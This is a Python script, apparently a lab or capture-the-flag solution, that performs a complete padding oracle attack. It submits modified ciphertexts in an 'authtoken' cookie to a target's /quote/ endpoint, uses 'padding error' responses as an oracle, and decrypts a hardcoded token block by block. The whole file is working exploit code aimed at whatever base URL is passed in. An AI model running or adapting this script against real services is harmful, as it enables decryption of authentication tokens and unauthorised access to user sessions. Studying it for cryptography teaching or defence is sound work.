import requests
import sys

def query_oracle(base_url, ciphertext_hex):
    """
    Query the padding oracle with the given ciphertext.
    Returns True if the padding is valid, False otherwise.
    """
    cookies = {'authtoken': ciphertext_hex}
    res = requests.get(f'{base_url}/quote/', cookies=cookies)
    return 'padding error' not in res.text

def decrypt_block(base_url, previous_block, target_block):
    """
    Decrypt a single block using the padding oracle.
    """
    decrypted_block = bytearray(16)  # Store the decrypted bytes
    for byte_index in range(15, -1, -1):  # Start from the last byte
        padding_value = 16 - byte_index  # Current padding value (1 to 16)
        for guess in range(256):  # Try all possible byte values (0-255)
            # Craft the modified previous block
            modified_previous_block = bytearray(previous_block)
            for i in range(15, byte_index, -1):
                modified_previous_block[i] = decrypted_block[i] ^ padding_value
            modified_previous_block[byte_index] = guess

            # Combine the modified previous block and the target block
            modified_ciphertext = modified_previous_block + target_block

            # Query the oracle
            if query_oracle(base_url, modified_ciphertext.hex()):
                # If the padding is valid, we found the correct byte
                decrypted_block[byte_index] = guess ^ padding_value
                break
    return decrypted_block

def padding_oracle_attack(base_url, ciphertext_hex):
    """
    Perform the padding oracle attack to decrypt the ciphertext.
    """
    ciphertext = bytes.fromhex(ciphertext_hex)
    blocks = [ciphertext[i:i+16] for i in range(0, len(ciphertext), 16)]  # Split into 16-byte blocks
    plaintext = bytearray()

    # Decrypt each block (starting from the second block)
    for i in range(1, len(blocks)):
        previous_block = blocks[i-1]
        target_block = blocks[i]
        decrypted_block = decrypt_block(base_url, previous_block, target_block)
        plaintext.extend(decrypted_block)

    # Remove padding from the plaintext
    padding_length = plaintext[-1]
    plaintext = plaintext[:-padding_length]

    return plaintext.decode('utf-8', errors='ignore')

def test_systems_security(base_url):
    """
    Test the padding oracle attack on the target system.
    """
    # Example ciphertext (replace with the actual ciphertext from the server)
    ciphertext_hex = '5cac653f1e8f0cfcd3a3e321e448dbf69313647b4f5c04c4bd456faee93abf298949b62b74fd1bb3a4da7c99e1c06a9ed47ff39f43a84df45e2165711a82d678'

    # Perform the padding oracle attack
    plaintext = padding_oracle_attack(base_url, ciphertext_hex)
    print(f'[+] Recovered plaintext:\n{plaintext}')

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print(f'usage: {sys.argv[0]} <base url>', file=sys.stderr)
        exit(1)
    test_systems_security(sys.argv[1])